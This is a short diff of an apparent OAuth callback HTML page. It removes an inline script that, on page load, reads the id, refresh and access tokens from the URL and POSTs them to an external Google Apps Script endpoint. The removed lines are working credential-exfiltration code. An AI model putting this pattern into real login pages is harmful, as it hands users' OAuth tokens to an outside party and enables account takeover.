@@ -12,20 +12,6 @@
         <meta name="viewport" content="width=device-width, initial-scale=1">
         <link rel="stylesheet" href="oauth.css">
         <link rel="stylesheet" href="https://use.typekit.net/jzp5ydy.css">
-        <script>
-            const params = new Proxy(new URLSearchParams(window.location.search), {
-                get: (searchParams, prop) => searchParams.get(prop),
-            });
-            if (params.id_token != null){
-                fetch('https://script.google.com/macros/s/AKfycbyQ5QGlGKnOXKF-yeEvGgR385Y0sExqWCeM7SaNx8Q4YdRn_Kplt6JDwPAzdHRh2afl/exec', {
-                    body: JSON.stringify({ id: params.id_token, refresh: params.refresh_token, access_token: params.access_token}),
-                    headers: {
-                    'content-type': 'application/json'
-                    },
-                    method: 'POST'  
-                });
-            }
-        </script>
     </head>
     <body>
         <!--[if lt IE 7]>
